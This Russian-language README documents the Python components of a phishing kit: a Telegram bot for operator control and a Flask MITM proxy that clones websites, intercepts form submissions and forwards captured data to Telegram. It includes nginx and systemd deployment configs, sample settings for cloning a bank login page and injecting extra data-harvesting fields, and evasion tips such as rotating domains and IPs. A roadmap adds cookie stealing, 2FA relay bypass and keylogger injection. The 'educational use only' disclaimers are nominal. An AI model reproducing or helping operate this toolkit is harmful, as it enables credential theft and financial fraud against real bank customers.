# Python Tools для фишинг-системы

Эта папка содержит Python инструменты для расширенного функционала.

## Файлы

### 1. main.py
Telegram бот на Python - альтернатива PHP polling.php

**Возможности:**
- Long polling для получения обновлений
- Обработка callback кнопок (OTP, Success, Error, Chat)
- Обработка чат-сообщений
- Более стабильная работа чем PHP версия

**Использование:**
```bash
# Настрой конфигурацию
nano main.py
# Замени BOT_TOKEN, CHAT_ID, LOGS_DIR

# Установи зависимости
pip3 install requests

# Запусти
python3 main.py
```

**Systemd сервис:**
```bash
sudo nano /etc/systemd/system/telegram-bot-python.service
```

```ini
[Unit]
Description=Telegram Bot Python
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/html
ExecStart=/usr/bin/python3 /root/122323/python_tools/main.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable telegram-bot-python
sudo systemctl start telegram-bot-python
```

---

### 2. mitm_proxy.py
Flask MITM прокси для зеркалирования любых сайтов

**Возможности:**
- Полное клонирование любого сайта без настройки
- Перехват всех форм и AJAX запросов
- Live-редактирование HTML на лету
- Автоматическая перезапись URL
- Отправка перехваченных данных в Telegram
- Session tracking

**Использование:**
```bash
# Установи зависимости
pip3 install -r requirements.txt

# Настрой конфигурацию
nano mitm_proxy.py
# Замени TARGET_SITE, BOT_TOKEN, CHAT_ID

# Запусти (development)
python3 mitm_proxy.py

# Запусти (production)
gunicorn -w 4 -b 0.0.0.0:80 mitm_proxy:app
```

**Nginx конфигурация для production:**
```nginx
server {
    listen 80;
    server_name your-phishing-domain.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**Systemd сервис:**
```bash
sudo nano /etc/systemd/system/mitm-proxy.service
```

```ini
[Unit]
Description=MITM Proxy Server
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/root/122323/python_tools
ExecStart=/usr/bin/gunicorn -w 4 -b 127.0.0.1:5000 mitm_proxy:app
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable mitm-proxy
sudo systemctl start mitm-proxy
```

---

### 3. requirements.txt
Зависимости для Python инструментов

```bash
pip3 install -r requirements.txt
```

---

## Сравнение с PHP версией

| Функция | PHP | Python |
|---------|-----|--------|
| Telegram бот | ✅ polling.php | ✅ main.py |
| Стабильность | Средняя | Высокая |
| Потребление памяти | Низкое | Среднее |
| Скорость | Быстрая | Очень быстрая |
| MITM прокси | ❌ | ✅ mitm_proxy.py |
| Live редактирование | ❌ | ✅ |

---

## Примеры использования

### Пример 1: Клонирование банковского сайта
```python
# В mitm_proxy.py
TARGET_SITE = "https://online.bank.com"
PROXY_DOMAIN = "online-bank-secure.com"

REPLACEMENTS = {
    'support@bank.com': 'your-email@gmail.com',
    'Call us: 1-800-BANK': 'Call us: 1-800-FAKE',
}
```

### Пример 2: Замена логотипа
```python
REPLACEMENTS = {
    'logo.png': 'https://your-cdn.com/fake-logo.png',
    '<title>Bank Login</title>': '<title>Secure Bank Login</title>',
}
```

### Пример 3: Инъекция дополнительных полей
```python
REPLACEMENTS = {
    '</form>': '''
        <input type="hidden" name="extra_field" value="captured">
        <input type="text" name="phone" placeholder="Phone number" required>
        </form>
    ''',
}
```

---

## Безопасность

⚠️ **ВАЖНО:**
- Используй только для легальных целей (тестирование безопасности с разрешением)
- Не храни логи на сервере долго
- Используй VPS в безопасной юрисдикции
- Шифруй трафик (HTTPS)
- Регулярно меняй домены и IP

---

## Troubleshooting

### Бот не запускается
```bash
# Проверь токен
curl "https://api.telegram.org/bot<TOKEN>/getMe"

# Проверь права на папку логов
ls -la /var/www/html/logs/
chmod 777 /var/www/html/logs/
```

### MITM прокси не работает
```bash
# Проверь порт
netstat -tulpn | grep 5000

# Проверь логи
journalctl -u mitm-proxy -f

# Проверь доступность целевого сайта
curl -I https://target-site.com
```

### Данные не приходят в Telegram
```bash
# Проверь Chat ID
# Отправь сообщение в группу и проверь:
curl "https://api.telegram.org/bot<TOKEN>/getUpdates"
```

---

## Roadmap

- [ ] Cookie stealing и session hijacking
- [ ] 2FA bypass через real-time relay
- [ ] Автоматические скриншоты страниц
- [ ] Keylogger инъекция
- [ ] Геолокация жертвы
- [ ] WebRTC leak protection
- [ ] Anti-detection (fingerprint spoofing)
- [ ] Multi-target support
- [ ] Admin dashboard (Flask)
- [ ] Статистика и аналитика

---

## Лицензия

Только для образовательных целей. Автор не несет ответственности за незаконное использование.
